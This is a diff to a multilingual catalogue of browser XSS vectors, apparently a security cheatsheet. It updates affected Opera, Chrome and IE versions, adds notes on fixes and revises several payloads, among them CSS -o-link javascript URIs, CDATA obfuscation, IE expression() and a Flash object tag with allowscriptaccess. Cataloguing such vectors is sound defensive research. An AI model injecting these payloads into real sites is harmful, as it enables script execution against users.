@@ -32,7 +32,8 @@ var items =
         },
         'browsers'   : {
 		    'firefox' : ['4.0'],
-            'opera': ['10.5', '10.6', 'mobile']
+            'opera': ['10.5', '10.6', '11.0', 'mobile'], 
+			'chrome': ['10.0']
         },
         'tags'       : ['xss', 'html5', 'opera', 'formaction', 'javascript', 'button'],
         'reporter'   : '.mario'
@@ -254,7 +255,7 @@ var items =
 		    'firefox' : ['4.0'],
             'opera': ['10.5', '10.6'],
             'safari' : ['4.0', '5.0'],
-            'chrome': ['4.0', '5.0', '6.0']
+            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0']
         },
         'tags'       : ['xss', 'autofocus', 'chrome', 'opera'],
         'reporter'   : 'Gareth'
@@ -291,9 +292,7 @@ var items =
         'browsers'   : {
 		    'firefox' : ['4.0'],
             'safari' : ['4.0', '5.0'],
-            'chrome': [
-                '4.0', '5.0', '6.0'
-            ]
+            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0']
         },
         'tags'       : ['xss', 'autofocus', 'blur', 'chrome', 'opera'],
         'reporter'   : '.mario'
@@ -309,9 +308,9 @@ var items =
             'de' : '',
             'tr' : 'Opera link-source özelliğinden yararlanarak CSS ile JavaScript çalıştırma'
         },
-        'data'       : '<div style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X',
+        'data'       : '<a style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X',
         'description': {
-            'en' : 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript',
+            'en' : 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript. Note that Opera 11 requires an actual <a> tag to have this work - while earlier versions work with other tags too.',
             'ja' : 'Opera\u306f\u4efb\u610f\u306eHTML\u8981\u7d20\u306b\u3001\u30af\u30ea\u30c3\u30af\u3057\u3066\u5b9f\u884c\u3067\u304d\u308bJavaScript\u3092\u542b\u3081\u308b\u3053\u3068\u306e\u3067\u304d\u308blink\u30bd\u30fc\u30b9\u306e\u8a2d\u5b9a\u3092\u8a31\u3057\u3066\u3044\u308b\u3002',
             'ru' : 'Opera позволяет устанавливать ссылки для любых HTML-тегов, делать их интерактивными и пригодными для внедрения JavaScript.',
             'cs' : 'Opera umožňuje nastavit link source pro některé HTML elementy. Můžou tak vyvpolat potřebnou akci po kliknutí',
@@ -329,7 +328,7 @@ var items =
         },          
         'browsers'   : {
             'opera': [
-                '8.0', '9.0', '10.x', 'mobile'
+                '8.0', '9.0', '10.x', '11.0', 'mobile'
             ]
         },
         'tags'       : ['xss', 'css', 'link-source', 'opera', 'proprietary'],
@@ -348,7 +347,7 @@ var items =
         },
         'data'       : '<video poster=%js_uri_alert%//',
         'description': {
-            'en' : 'Opera 10.5+ allows using poster attributes in combination with javascript: URIs',
+            'en' : 'Opera 10.5+ allows using poster attributes in combination with javascript: URIs. This bug has been fixed in Opera 11.',
             'ja' : '',
             'ru' : 'Opera 10.5+ поддерживает атрибут poster в сочетании с псевдоскриптом.',
             'cs' : 'Opera 10.5+ umožňuje vložit do atributu poster URL se schématem javascript:',
@@ -400,8 +399,8 @@ var items =
             'tr' : 'SVG dosyaları sadece birer resim olarak işlenmemeli - özellikle yüklemeler ile geliyorsa. Bir SVG dosyası keyfi HTML verileri ve bu HTML verileride normal öğeleri içinde olay yakalayıcıları içerebilir.'
         },                        
         'browsers'   : {
-            'opera': ['10.0', '10.5', '10.6'],
-            'chrome': ['4.0', '5.0', '6.0'],
+            'opera': ['10.0', '10.5', '10.6', '11.0'],
+            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'firefox': ['3.0', '3.5', '3.6', '3.7'],
 			'safari' : ['5.0']          
         },
@@ -439,9 +438,9 @@ var items =
         },          
         'browsers'   : {
 		    'firefox' : ['4.0'],
-            'opera': ['10.5', '10.6'],
+            'opera': ['10.5', '10.6', '11.0'],
             'safari' : ['4.0', '5.0'],
-            'chrome': ['4.0', '5.0', '6.0']
+            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0']
         },
         'tags'       : ['xss', 'autofocus', 'scroll', 'chrome', 'opera'],
         'reporter'   : '.mario'
@@ -651,9 +650,9 @@ var items =
             'tr' : ''
         },            
         'browsers'   : {
-            'opera': ['8.x', '9.x', '10.x'], 
+            'opera': ['8.x', '9.x', '10.x', '11.0'], 
             'firefox' : ['1.x', '2.x', '3.x', '4.0'], 
-            'chrome': ['3.0', '4.0', '5.0', '6.0'],
+            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
 			'safari' : ['5.0']
         },
         'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css'],
@@ -724,9 +723,9 @@ var items =
             'tr' : 'Kullanıcı betik enjekte ederek, dahil ederek veya diğer DOM tabanlı özelliklere erişerek DOM\'u etkilendiğinde sakın DOM\'a güvenmeyin.'
         },            
         'browsers'   : {
-            'opera': ['8.x', '9.x', '10.x'], 
+            'opera': ['8.x', '9.x', '10.x', '11.0'], 
             'firefox' : ['1.x', '2.x', '3.x', '4.0'], 
-            'chrome': ['3.0', '4.0', '5.0', '6.0'],
+            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0'],
             'safari': ['4.0', '5.0']
         },
         'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css'],
@@ -798,8 +797,8 @@ var items =
         },            
         'browsers'   : {
 		    'firefox' : ['4.0'],
-            'opera': ['8.x', '9.x', '10.x'], 
-            'chrome': ['3.0', '4.0', '5.0', '6.0'],
+            'opera': ['8.x', '9.x', '10.x', '11.0'], 
+            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
 			'safari' : ['5.0']
         },
         'tags'       : ['dos', 'javascript', 'opera', 'chrome', 'autofocus', 'onblur', 'html5'],
@@ -835,7 +834,7 @@ var items =
             'tr' : 'Kullanıcıların form, "onformchange" ve "onforminput" dahil herhangi bir markup sağlamadığından emin olun. <FORM> elemanlarına "id" özelliği uygulamayın.'
         },                        
         'browsers'   : {
-            'opera' : ['10.5', '10.6', 'mobile'] 
+            'opera' : ['10.5', '10.6', '11.0', 'mobile'] 
         },
         'tags'       : ['surveillance', 'javascript', 'opera', 'html5', 'onforminput', 'onformchange'],
         'reporter'   : 'Skyphire, .mario'
@@ -958,7 +957,7 @@ var items =
         },
         'data'       : '<style>p[foo=bar{}*{-o-link:\'%js_uri_alert%\'}{}*{-o-link-source:current}]{color:red};</style>',
         'description': {
-            'en' : 'Opera as well as other browsers allow to break out attribute selectors and other CSS constructs with {...} - opening the possibility for declaring new properties and assigning values - such as -o-link and -o-link-source. In this case those proprietary properties allow overlaying any selected element with a JavaScript URI link href.',
+            'en' : 'Opera as well as other browsers allow to break out attribute selectors and other CSS constructs with {...} - opening the possibility for declaring new properties and assigning values - such as -o-link and -o-link-source. In this case those proprietary properties allow overlaying any selected element with a JavaScript URI link href. Note that as of Opera 11 -o-link only applies for <a> tags.',
             'ja' : '',
             'ru' : 'Opera, как и другие браузеры, допускают выход за пределы селектора и других CSS-конструкций с помощью {...}, что открывает возможность для декларирования новых свойств и их значений, создавая видимость продолжения селектора.',
             'cs' : 'Opera, podobně jako další prohlížeče, umožňuje vložit do selektorů a dalších míst složené konstrukce s {...}, což umožňuje deklarovat nové vlastnosti a přiřadit jim hodnoty, jako -o-link a -o-link-source. V tomto případě tyto proprietární vlastnosti mohou přiřadit libovolnému HTML elementu odkaz, který obsahuje JavaScript URI',
@@ -974,7 +973,7 @@ var items =
             'de' : ''
         },            
         'browsers'   : {
-            'opera': ['8.x', '9.x', '10.x', 'mobile']
+            'opera': ['8.x', '9.x', '10.x', '11.0', 'mobile']
         },
         'tags'       : ['xss', 'javascript', 'css', 'opera', 'attribute selectors', 'proprietary'],
         'reporter'   : '.mario'
@@ -1103,9 +1102,9 @@ var items =
         },            
         'browsers'   : {
             'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
-            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
+            'opera': ['8.x', '9.x', '10.x', '11.0', 'mobile'], 
             'firefox' : ['1.x', '2.x', '3.x', '4.0'], 
-            'chrome': ['3.0', '4.0', '5.0', '6.0'],
+            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari': ['3.0', '4.0', '5.0']
         },
         'tags'       : ['xss', 'javascript', 'frames', 'classic', 'html', 'onload'],
@@ -1123,7 +1122,7 @@ var items =
         },
         'data'       : '<table background="javascript:%js_alert%">',
         'description': {
-            'en' : 'Opera 8-10.5+ as well as Internet Explorer 6 support JavaScript URIs for <TABLE> and some other tags\' "background" attributes. This causes JavaScript execution without user interaction.',
+            'en' : 'Opera 8-10.5+ as well as Internet Explorer 6 support JavaScript URIs for <TABLE> and some other tags\' "background" attributes. This causes JavaScript execution without user interaction. The problem has been fixed in Opera 11.',
             'ja' : '',
             'ru' : 'Opera 8-10.5+ , а также Internet Explorer 6 поддерживают псевдоскрипт в теге <TABLE> и некоторых других тегах в атрибуте background. Это открывает возможность выполнения JavaScript без участия пользователя.',
             'cs' : 'Opera 8-10.5+, stejně jako IE6, podporují JS URI pro atribut "background" u tagů jako TABLE. Skript se tak spustí bez zásahu uživatele.',
@@ -1173,7 +1172,7 @@ var items =
         'browsers'   : {
             'firefox': ['3.6', '3.7', '4.0'], 
 			'safari' : ['5.0'],
-			'chrome' : ['7.0', '8.0']
+			'chrome' : ['7.0', '8.0', '9.0', '10.0']
         },
         'tags'       : ['xss', 'hijacking', 'css', 'pointer-events', 'firefox'],
         'reporter'   : '.mario'
@@ -1309,9 +1308,9 @@ var items =
         },            
         'browsers'   : {
             'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
-            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
+            'opera': ['8.x', '9.x', '10.x', '11.0', 'mobile'], 
             'firefox' : ['1.x', '2.x', '3.x', '4.0'], 
-            'chrome': ['3.0', '4.0', '5.0', '6.0'],
+            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari': ['3.0', '4.0', '5.0']
         },
         'tags'       : ['xss', 'javascript', 'comment', 'parsing', 'attributes'],
@@ -1361,7 +1360,7 @@ var items =
         },
         'data'       : '<![><img src="]><img src=x onerror=%js_alert%//">',
         'description': {
-            'en' : 'Firefox and Opera allow using CDATA section delimiters in HTML - in the stripped form "<![" as well as including padding like "<![CDATA[". This can cause problems for filter mechanisms since those delimiters can be used for massive obfuscation.',
+            'en' : 'Firefox and Opera allow using CDATA section delimiters in HTML - in the stripped form "<![" as well as including padding like "<![CDATA[". This can cause problems for filter mechanisms since those delimiters can be used for massive obfuscation. Firefox 4 has fixed the issue.',
             'ja' : '',
             'ru' : 'Firefox и Opera разрешают использовать разделители CDATA-секций в HTML. В сокращенной форме "<![" то же самое, что и "<![CDATA[". Это может породить проблемы для механизма фильтрации, поскольку эти разделители могут быть использованы для обфускации.',
             'cs' : 'Firefox a Opera umožňují oddělovače sekce CDATA v HTML - ve zkrácené formě "<![" stejně jako v té plné "<![CDATA[" Může to způsobit řadu problémů u filtrů, pokud budou použityt jako masivní obfuskace.',
@@ -1376,7 +1375,7 @@ var items =
             'de' : ''
         },            
         'browsers'   : {
-            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
+            'opera': ['8.x', '9.x', '10.x', '11.0', 'mobile'], 
             'firefox' : ['1.x', '2.x', '3.x']
         },
         'tags'       : ['xss', 'javascript', 'cdata', 'parsing', 'attributes'],
@@ -1410,9 +1409,9 @@ var items =
         },            
         'browsers'   : {
             'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
-            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
+            'opera': ['8.x', '9.x', '10.x', '11.0', 'mobile'], 
             'firefox' : ['1.x', '2.x', '3.x', '4.0'], 
-            'chrome': ['3.0', '4.0', '5.0', '6.0'],
+            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari': ['3.0', '4.0', '5.0']
         },
         'tags'       : ['xss', 'javascript', 'plaintext', 'tags', 'parsing', 'attributes'],
@@ -1445,7 +1444,7 @@ var items =
             'de' : ''
         },            
         'browsers'   : {
-            'opera': ['8.x', '9.x', '10.x', 'mobile'] 
+            'opera': ['8.x', '9.x', '10.x', '11.0', 'mobile'] 
         },
         'tags'       : ['xss', 'javascript', 'css', 'background', 'opera', 'onerror', 'content'],
         'reporter'   : 'LeverOne, .mario'
@@ -1462,7 +1461,7 @@ var items =
         },
         'data'       : '<head><base href="javascript://"></head><body><a href="/. /,%js_alert%//#">XXX</a></body>',
         'description': {
-            'en' : '<BASE> link hijacking with JavaScript URIs works on Internet Explorer, Opera (O8-10.5 in case the link URL starts with #) and Safari. User interaction is required to execute the JavaScript. The vector sometimes has to be changed slightly to work for all mentioned user agents.',
+            'en' : '<BASE> link hijacking with JavaScript URIs works on Internet Explorer, Opera (O8-10.5 in case the link URL starts with #) and Safari. User interaction is required to execute the JavaScript. The vector sometimes has to be changed slightly to work for all mentioned user agents. Opera 11 ships a more or less working fix.',
             'ja' : '',
             'ru' : 'Этот вектор работает в Internet Explorer, Opera (O8-10.5 в случае, если URL ссылки начинается с #) и Safari. Для выполнения JavaScript необходимо взаимодействие с пользователем. Вектор иногда приходится слегка изменять для работоспособности во всех заявленных браузерах.',
             'cs' : 'Hijacking odkazu v tagu <BASE> s JavaScriptovými URI pracuje v Internet Exploreru, Opeře (O8-10.5 v případě, že URL odkazu začíná na #) a v Safari. Ke spuštění kódu je vyžadována spoluúčast uživatele. Navíc je pro správnou funkci v jednotlivých prohlížečích potřeba použít mírně upravený zápis.',
@@ -1557,7 +1556,7 @@ var items =
             'de' : ''
         },            
         'browsers'   : {
-            'opera': ['8.0', '9.0', '10.x', 'mobile']
+            'opera': ['8.0', '9.0', '10.x', '11.0', 'mobile']
         },
         'tags'       : ['xss', 'javascript', 'opera', 'css', 'hijacking', 'proprietary'],
         'reporter'   : '.mario'
@@ -1589,9 +1588,9 @@ var items =
             'de' : ''
         },            
         'browsers'   : {
-            'opera': ['8.0', '9.0', '10.x', 'mobile'],
+            'opera': ['8.0', '9.0', '10.x', '11.0', 'mobile'],
             'firefox' : ['1.x', '2.x', '3.x', '4.0'],
-            'chrome': ['3.0', '4.0', '5.0', '6.0'],
+            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari': ['3.0', '4.0', '5.0'],
             'internet explorer': ['8.0', '9.0']
         },
@@ -1657,8 +1656,8 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera': ['10.x'],
-            'chrome': ['4.0', '5.0', '6.0'],
+            'opera': ['10.x', '11.0'],
+            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0'],
             'firefox': ['3.x', '4.0'],
             'internet explorer': ['9.0'],
 			'safari' : ['5.0']
@@ -1693,7 +1692,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera': ['10.x', 'mobile'],
+            'opera': ['10.x', '11.0', 'mobile'],
             'internet explorer': ['6.0', '7.0', '8.0', '9.0']
         },
         'tags'       : ['xss', 'javascript', 'opera', 'for', 'event', 'internet explorer'],
@@ -1758,9 +1757,9 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
+            'opera': ['8.x', '9.x', '10.x', '11.0', 'mobile'], 
             'firefox': ['1.x', '2.x', '3.x', '4.0'], 
-            'chrome': ['3.0', '4.0', '5.0', '6.0'],
+            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari': ['4.0', '5.0']
         },
         'tags'       : ['xss', 'javascript', 'opera', 'chrome', 'embed', 'safari', 'src', 'firefox', 'base64'],
@@ -1793,9 +1792,9 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
-            'chrome': ['3.0', '4.0', '5.0', '6.0'],
-            'safari': ['4.x']
+            'opera': ['8.x', '9.x', '10.x', '11.0', 'mobile'], 
+            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
+            'safari': ['4.0', '5.0']
         },
         'tags'       : ['xss', 'javascript', 'opera', 'chrome', 'embed', 'safari', 'src', 'base64'],
         'reporter'   : '.mario'
@@ -1834,7 +1833,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
+            'internet explorer': ['5.5', '6.0', '7.0', '8.0']
         },
         'tags'       : ['xss', 'javascript', 'behavior', 'scriptlet', 'internet explorer', 'style', 'css', 'sct'],
         'reporter'   : '.mario'
@@ -1939,8 +1938,8 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera': ['10.5', '10.6'],
-            'chrome': ['4.0', '5.0', '6.0']
+            'opera': ['10.5', '10.6', '11.0'],
+            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0']
         },
         'tags'       : ['xss', 'javascript', 'video', 'source', 'html5', 'opera', 'chrome', 'audio'],
         'reporter'   : '.mario'
@@ -2104,9 +2103,9 @@ var items =
         },                        
         'browsers'   : {
             'firefox': ['2.x', '3.x', '4.0'],
-            'opera': ['9.x', '10.x', 'mobile'],
+            'opera': ['9.x', '10.x', '11.0', 'mobile'],
             'internet explorer': ['6.0', '7.0', '8.0', '9.0'],
-            'chrome' : ['5.0', '6.0'],
+            'chrome' : ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari' : ['4.0', '5.0']
         },
         'tags'       : ['trick', 'css', 'quirks mode', 'obfuscation', 'opera', 'firefox', 'internet explorer', 'chrome', 'safari', 'fuzzing', 'quirks mode'],
@@ -2122,7 +2121,7 @@ var items =
             'cs' : 'Kódování a escapování znaků v CSS',
             'de' : ''
         },
-        'data'       : '<div x="javasc&#x0Aript:%js_alert%" style="\\000062\\00065\\68\\0\\00	\\&#xA0\\000061 vio\\r:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E din\\g:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:attr(x);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-s\\ource:current" end=0 onend=%js_alert%>XXX',
+        'data'       : '<a x="javasc&#x0Aript:%js_alert%" style="\\000062\\00065\\68\\0\\00	\\&#xA0\\000061 vio\\r:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E din\\g:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:attr(x);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-s\\ource:current" end=0 onend=%js_alert%>XXX',
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '0',            
@@ -2147,7 +2146,7 @@ var items =
         },                        
         'browsers'   : {
             'firefox': ['1.5', '2.x', '3.x', '4.0'],
-            'opera': ['8.x', '9.x', '10.x', 'mobile'],
+            'opera': ['8.x', '9.x', '10.x', '11.0', 'mobile'],
             'internet explorer': ['6.0', '7.0', '8.0', '9.0']
         },
         'tags'       : ['xss', 'javascript', 'css', 'encoding', 'escape', 'backslash', 'opera', 'firefox', 'internet explorer'],
@@ -2261,7 +2260,7 @@ var items =
         'tags'       : ['xss', 'javascript', 'xxe', 'safari', 'chrome', 'xml', 'entities', 'doctype'],
         'reporter'   : '.mario'
     },    
-    { /* ID 65 - SVG onload injection without g tag */
+    { /* ID 65 - SVG element allows automatic execution of onload attribute without other SVG elements */
         'id'         : 65,
         'category'   : 'svg', 
         'name'       : {
@@ -2288,10 +2287,10 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'chrome': ['4.0', '5.0', '6.0'],
+            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari': ['3.4', '4.0', '5.0'],
 			'firefox': ['3.x', '4.0'],
-			'opera': ['9.x', '10.x']
+			'opera': ['9.x', '10.x', '11.0']
         },
         'tags'       : ['xss', 'svg', 'onload','chrome','firefox','safari','opera'],
         'reporter'   : 'gareth'
@@ -2324,7 +2323,7 @@ var items =
         },                        
         'browsers'   : {
             'opera': [
-                '8.0', '9.0', '10.x', 'mobile'
+                '8.0', '9.0', '10.x', '11.0', 'mobile'
             ]
         },
         'tags'       : ['xss', 'javascript', 'opera', 'xslt', 'xsl', 'stylesheet', 'xml'],
@@ -2357,10 +2356,10 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'chrome': ['4.0', '5.0', '6.0'],
+            'chrome': ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari': ['3.0', '4.0', '5.0'],
             'firefox': ['3.0', '3.5', '3.6', '3.7', '4.0'],        
-            'opera': ['8.0', '9.0', '10.x', 'mobile']
+            'opera': ['8.0', '9.0', '10.x', '11.0', 'mobile']
         },
         'tags'       : ['xss', 'javascript', 'opera', 'attlist', 'doctype', 'chrome', 'firefox', 'safari'],
         'reporter'   : '.mario'
@@ -2424,7 +2423,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera': ['9.x', '10.x', 'mobile']
+            'opera': ['9.x', '10.x', '11.0', 'mobile']
         },
         'tags'       : ['xss', 'javascript', 'wmlscript', 'wml', 'opera', 'mobile', 'timer'],
         'reporter'   : '.mario'
@@ -2471,7 +2470,7 @@ var items =
             'cs' : '',
             'de' : ''
         },
-        'data'       : '</ style=?=-=expression\\28%js_write%\\29>',
+        'data'       : '<// style=x:expression\\28%js_write%\\29>',
         'description': {
             'en' : 'An unnamed closing tag can still contain style attributes on IE as the example shows. For extra obfuscation a bogus CSS property is being used to execute the JavaScript via expression() combined with CSS escapes.', 
             'ja' : '',
@@ -2488,7 +2487,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'internet explorer': ['6.0', '7.0', '8.0']
+            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
         },
         'tags'       : ['xss', 'javascript', 'closing tag', 'css', 'style', 'expression', 'internet explorer', 'quirks mode'],
         'reporter'   : 'Gareth, .mario'
@@ -2521,7 +2520,8 @@ var items =
         },
         'browsers'   : {
 		    'firefox': ['4.0'],
-            'opera': ['10.5', '10.6', 'mobile']
+            'opera': ['10.5', '10.6', '11.0', 'mobile'], 
+			'chrome': ['10.0']
         },
         'tags'       : ['xss', 'html5', 'opera', 'formaction', 'javascript', 'button'],
         'reporter'   : '.mario'
@@ -2749,7 +2749,7 @@ var items =
             'cs' : 'JavaScript s využitím tagu <OBJECT> a Flashového souboru',
             'de' : ''
         },
-        'data'       : '<object data="%swf_path%"></object>',
+        'data'       : '<object allowscriptaccess="always" data="%swf_path%"></object>',
         'description': {
             'en' : '<OBJECT> tags directly including Flash files via the "data" attribute - allowing execution of JavaScript and more without user interaction.',
             'ja' : '',
@@ -2775,7 +2775,7 @@ var items =
         'browsers'   : {
             'safari': ['3.0', '4.0', '5.0'],
             'firefox': ['1.5', '2.x', '3.x', '4.0'],        
-            'opera': ['10.x', 'mobile'],
+            'opera': ['10.x', '11.0', 'mobile'],
             'internet explorer': ['6.0', '7.0', '8.0', '9.0']
         },
         'tags'       : ['xss', 'javascript', 'object', 'flash', 'swf', 'safari', 'firefox', 'opera'],
@@ -2904,7 +2904,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera': ['9.x', '10.x', 'mobile']
+            'opera': ['9.x', '10.x', '11.0', 'mobile']
         },
         'tags'       : ['xss', 'javascript', 'wml', 'opera', 'mobile', 'timer', 'variable'],
         'reporter'   : 'LeverOne, .mario'
@@ -2921,7 +2921,7 @@ var items =
         },
         'data'       : '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="%js_uri_alert%//#x"/>',
         'description': {
-            'en' : 'The browser tries to load an external XML-event handler and executed javascript without user interaction.', 
+            'en' : 'The browser tries to load an external XML-event handler and execute JavaScript without user interaction. The problem seems to be fixed in Opera 11.', 
             'ja' : '',
             'ru' : 'Браузер пытается загрузить внешний обработчик XML-события и выполняет javascript.',
             'cs' : 'Webový prohlížeč používá externí XML-event handler pro událost "load" pro spuštění JavaScriptu bez uživatelské interakce.',
@@ -2960,7 +2960,7 @@ var items =
             'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml" id="x">%js_alert%</script>'
         },
         'description': {
-            'en' : 'The browser loads an external xml-event handler, which contains the javascript-code. This example also works with data URI.', 
+            'en' : 'The browser loads an external xml-event handler, which contains the JavaScript code. This example also works with data URIs.', 
             'ja' : '',
             'ru' : 'Браузер загружает внешний обработчик XML-события, который содержит javascript код. Этот пример также будет работать с data-схемой.',
             'cs' : 'Browser načítá externí xml-event handler, který obsahuje kód JavaScriptu. Tento příklad pracuje také s data URI.',
@@ -3009,8 +3009,8 @@ var items =
         'browsers'   : {
             'firefox' : ['3.6', '3.7', '4.0'], 
             'safari' : ['4.0', '5.0'], 
-            'chrome' : ['4.0', '5.0', '6.0'],
-            'opera': ['9.x', '10.x', 'mobile']
+            'chrome' : ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
+            'opera': ['9.x', '10.x', '11.0', 'mobile']
         },
         'tags'       : ['xss', 'javascript', 'html5', 'oninput', 'form', 'passive', 'event'],
         'reporter'   : 'Skyphire'
@@ -3042,10 +3042,10 @@ var items =
             'de' : ''
         }, 
         'browsers'   : {
-           'chrome' : ['4.0', '5.0', '6.0'],
+           'chrome' : ['4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
            'safari' : ['3.4', '4.0', '5.0'],
 	       'firefox': ['3.x', '4.0'],
-	       'opera'  : ['9.x', '10.x']
+	       'opera'  : ['9.x', '10.x', '11.0']
         },
         'tags'       : ['xss', 'svg', 'passive', 'xlink', 'chrome', 'firefox', 'safari', 'opera'],
         'reporter'   : 'LeverOne'
@@ -3077,7 +3077,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-	       'opera'  : ['9.x', '10.x']
+	       'opera'  : ['9.x', '10.x', '11.0']
         },
         'tags'       : ['xss', 'svg', 'active', 'xlink', 'opera'],
         'reporter'   : 'LeverOne'
@@ -3094,7 +3094,7 @@ var items =
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<set attributeName="onmouseover" to="%js_alert%"/>\n<animate attributeName="onunload" to="%js_alert%"/>\n</svg>',        
         'description': {
-            'en' : 'Google Chrome and Safari support binding an event handler using the elements <set> or <animate>. The attribute value is the actually bound event while the "to" attribute value holds the payload.',
+            'en' : 'Google Chrome and Safari support binding an event handler using the elements <set> or <animate>. The attribute value is the actually bound event while the "to" attribute value holds the payload. The problem has been fixed in recent Chrome versions.',
             'ja' : '',
             'ru' : 'Google Chrome и Safari поддерживают привязку обработчика события с использованием элементов <set> или <animate>.',
             'cs' : 'Google Chrome a Safari podporují zpracování událostí u prvků <set> nebo <animate>. Hodnota atributu "attributeName" určuje spouštěcí událost, zatímco atribut "to" obsahuje samotný kód JavaScriptu.',
@@ -3140,7 +3140,7 @@ var items =
             'cs' : 'Opera podporuje CSS vlastnost "content" pro atributy stylu. Obrázek ve formátu SVG může obsahovat SVG stejně dobře jako HTML kód. Příklad ukazuje jak může být tag <FORM> použit pro nalákání uživatele ke kliknutí na tlačítko a tím k provedení JavaScriptu. Stejné pracuje také pro SVG soubory vložené pomocí tagu <IMG>.',
             'de' : ''
         },
-        'urls'    : [],
+        'urls'    : ['http://heideri.ch/opera/'],
         'howtofix'   : {
             'en' : '',
             'ja' : '',
@@ -3149,7 +3149,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-	       'opera'  : ['10.x']
+	       'opera'  : ['10.x', '11.0']
         },
         'tags'       : ['xss', 'svg', 'css', 'opera', 'content', 'form'],
         'reporter'   : 'LeverOne'
@@ -3182,9 +3182,9 @@ var items =
         },                        
         'browsers'   : {
             'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
-            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
+            'opera': ['8.x', '9.x', '10.x', '11.0', 'mobile'], 
             'firefox' : ['1.x', '2.x', '3.x', '4.x'], 
-            'chrome': ['3.0', '4.0', '5.0', '6.0'],
+            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
             'safari': ['3.0', '4.0','5.0']
         },
         'tags'       : ['xss', 'tagname', 'internet explorer', 'opera', 'firefox', 'chrome', 'safari', 'parsing', 'breaking', 'obfscation', 'closing tag'],
@@ -3281,7 +3281,7 @@ var items =
             'de' : ''
         },
         'browsers'   : {
-            'opera'  : ['10.x', '10.5', '10.6', 'mobile']
+            'opera'  : ['10.x', '10.5', '10.6', '11.0', 'mobile']
         },
         'tags'       : ['xss', 'svg', 'opera', 'XML-events'],
         'reporter'   : 'LeverOne'
@@ -3313,7 +3313,7 @@ var items =
             'de' : ''
         },
         'browsers'   : {
-            'opera'  : ['10.x', '10.5', '10.6', 'mobile']
+            'opera'  : ['10.x', '10.5', '10.6', '11.0', 'mobile']
         },
         'tags'       : ['xss', 'svg', 'opera', 'filter effects', 'feimage'],
         'reporter'   : '.mario'
@@ -3384,9 +3384,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'internet explorer': [
-                '6.0', '7.0', '8.0'
-            ]
+            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
         },
         'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml'],
         'reporter'   : 'LeverOne'
